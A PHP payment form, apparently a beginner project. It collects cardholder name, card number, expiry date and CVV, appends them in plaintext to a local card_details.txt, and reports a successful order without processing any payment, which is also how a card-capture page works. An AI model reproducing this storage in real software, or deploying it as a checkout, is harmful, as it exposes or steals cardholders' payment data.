<!DOCTYPE html>
<html>
<head>
    <title>Payment Form</title>
</head>
<body>
    <?php
    // Check if the form is submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $nameOnCard = $_POST['name_on_card'];
        $cardnumber = $_POST['cardnumber'];
        $expiryDate = $_POST['expiry_date'];
        $cvv = $_POST['cvv'];

        // Save the form data to a file
        $data = "Name on Card: $nameOnCard\n Card Number: $cardnumber\n Expiry Date: $expiryDate\n CVV: $cvv\n";
        file_put_contents('card_details.txt', $data, FILE_APPEND | LOCK_EX);

        // Display a success message
        echo "<h2>Order Placed Successfully!</h2>";
    }
    ?>
  <div class="new">
    <center><h1>Card Details</h1></center>
  <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
        <label for="name_on_card">Name on Card:</label>
        <input type="text" id="name_on_card" name="name_on_card" required><br><br>

        <label for="cardnumber">Card-number:</label>
        <input type="text" id="cardnumber" name="cardnumber" required><br><br>

        <label for="expiry_date">Expiry Date:</label>
        <input type="text" id="expiry_date" name="expiry_date" required><br><br>

        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" required><br><br>

        <input type="submit" value="Submit" class="button" onclick="x">
        <div class="end">
        <center><a href="one.php"><strong><h3>Pay With QR</h3></strong></a></center>
        </div>
    </form>
    <script>
      function x(){
        alert("Order Place Successfully");
      }
    </script>
  </div>
    <style>
        body{
          background-image: url("back.jpeg");
           background-repeat: no-repeat;
           background-size: cover;
        }
        .end{
            margin-top: 20px;
        }
    a{
        text-decoration: none;
        color: black;
        margin-top: 5px;
    }
        .new{
    height: 500px;
  width: 400px;
  /* border: 2px solid black; */
  margin: 0 auto;
  margin-top: 20px;
  padding: 20px;
  background-color: whitesmoke;
}

h1 {
  text-align: center;
}

.form-group {
  margin-bottom: 15px;
}

label {
  display: block;
  font-weight: bold;
}

input[type="text"] {
  width: 95%;
  padding: 8px;
  border: 1px solid #ccc;
  border-radius: 4px;
}
input[type="date"] {
  width: 95%;
  padding: 8px;
  border: 1px solid #ccc;
  border-radius: 4px;
}
input[type="number"] {
  width: 95%;
  padding: 8px;
  border: 1px solid #ccc;
  border-radius: 4px;
}
.button {
  display: block;
  width: 98%;
  padding: 10px;
  background-color: #4caf50;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  text-decoration: none;
  color: white;
}

button:hover {
  background-color: #45a049;
}
    </style>
</body>
</html>
